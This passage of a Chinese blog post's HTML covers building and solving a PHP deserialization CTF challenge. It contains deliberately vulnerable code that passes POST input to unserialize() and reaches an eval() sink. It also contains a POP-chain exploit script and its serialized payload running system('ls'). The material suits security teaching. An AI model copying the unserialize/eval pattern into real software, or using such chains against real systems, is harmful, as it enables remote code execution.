class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boss</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">boss</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;tail;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to &quot;</span>.<span class="variable language_">$this</span>-&gt;head.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;head)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;nice-&gt;nose;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Monkey</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hint in hint.php!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到这样一条链子<a target="_blank" rel="noopener" href="https://www.yuque.com/ff2qqy/hlcg0a/rss218/edit">关于php反序列化和pop链的学习</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Money</span>::<span class="variable constant_">__wakeup</span> -&gt; <span class="title class_">Elephant</span>::<span class="variable constant_">__toString</span> -&gt; <span class="title class_">Lion</span>::<span class="variable constant_">__get</span> -&gt; <span class="title class_">Tiger</span>::<span class="variable constant_">__invoke</span></span><br></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Elephant</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice = <span class="keyword">new</span> <span class="title class_">Lion</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice-&gt;tail = <span class="keyword">new</span> <span class="title class_">Tiger</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Monkey</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成得到的序列化字符串：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Monkey%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>head%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Elephant%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nose%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Lion%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>tail%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>Tiger%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>ls%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>hand%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>通过post传递给zoo</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/">php反序列化题目搭建</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-05-05, 00:00:00</p>
+        <p><span>最后更新:</span>2022-05-28, 15:43:54</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/" title="php反序列化题目搭建">http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/">
+                    php反序化和pop链
+                </a>
+            </div>
+        
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEDocker"><span class="toc-number">1.</span> <span class="toc-text">1.安装配置Docker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E7%94%B1%E4%BA%8E%E8%87%AA%E5%B8%A6-yum-%E6%B2%A1%E6%9C%89-Docker-CE-%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%85%88%E5%A2%9E%E5%8A%A0-docker-repo%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">1.1.由于自带 yum 没有 Docker-CE 所以我们需要先增加 docker repo：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E7%94%A8-yum-%E5%AE%89%E8%A3%85-Docker%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">1.2.用 yum 安装 Docker：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E7%9B%B4%E6%8E%A5yum%E5%AE%89%E8%A3%85%EF%BC%8C%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E5%90%8E%E6%9F%A5%E7%9C%8B%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">1.3.直接yum安装，安装成功后查看版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-4-%E5%90%AF%E5%8A%A8docker%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">1.4.启动docker：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-5-%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">1.5.设置开机启动：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-6%E9%85%8D%E7%BD%AEDocker%EF%BC%9A"><span class="toc-number">1.6.</span> <span class="toc-text">1.6配置Docker：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BActf%E9%A2%98%E7%9B%AE"><span class="toc-number">2.</span> <span class="toc-text">2.使用docker搭建ctf题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1%E6%90%9C%E7%B4%A2lamp%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%95%9C%E5%83%8F"><span class="toc-number">2.1.</span> <span class="toc-text">2.1搜索lamp环境的docker镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E6%8B%89%E5%8F%96tutum-x2F-lamp%E9%95%9C%E5%83%8F"><span class="toc-number">2.2.</span> <span class="toc-text">2.2拉取tutum&#x2F;lamp镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3%E6%8B%89%E5%8F%96%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%9C%AC%E5%9C%B0docker%E9%95%9C%E5%83%8F"><span class="toc-number">2.3.</span> <span class="toc-text">2.3拉取完成后，查看本地docker镜像</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AAdocker%E5%AE%B9%E5%99%A8"><span class="toc-number">2.4.</span> <span class="toc-text">2.4新建一个docker容器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%B8%AD%E8%BF%90%E8%A1%8C%E7%9A%84docker%E5%AE%B9%E5%99%A8%E3%80%82"><span class="toc-number">2.5.</span> <span class="toc-text">2.5查看系统中运行的docker容器。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%E4%B8%BB%E9%A1%B5%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%98%A0%E5%B0%84%E6%98%AF%E5%90%A6%E6%AD%A3%E5%B8%B8"><span class="toc-number">2.6.</span> <span class="toc-text">2.6使用浏览器访问访问一下主页，查看映射是否正常</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7%E5%B0%86ctf%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81%E6%8B%B7%E8%B4%9D%E5%88%B0container%E7%9A%84%E4%B8%BB%E7%9B%AE%E5%BD%95%E4%B8%AD"><span class="toc-number">2.7.</span> <span class="toc-text">2.7将ctf题目源码拷贝到container的主目录中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8%E8%BF%9B%E5%85%A5docker-container"><span class="toc-number">2.8.</span> <span class="toc-text">2.8进入docker container</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-9%E8%BF%9B%E5%85%A5%E5%AE%B9%E5%99%A8%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%8C%E5%88%9B%E5%BB%BA%E5%A5%BDctf%E9%A2%98%E7%9B%AE%E9%9C%80%E8%A6%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%AD%89%E7%AD%89"><span class="toc-number">2.9.</span> <span class="toc-text">2.9进入容器中的数据库，创建好ctf题目需要的数据库、数据表等等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-10%E5%AE%89%E8%A3%85docker-compose"><span class="toc-number">2.10.</span> <span class="toc-text">2.10安装docker-compose</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98part"><span class="toc-number">3.</span> <span class="toc-text">3.解题part</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"php反序列化题目搭建　| Qhkk's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/" title="上一篇: php反序化和pop链">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/05/06/hello-world/">Hello World</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/">php反序化和pop链</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%90%AD%E5%BB%BA/">php反序列化题目搭建</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2016-2022 Qhkk
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
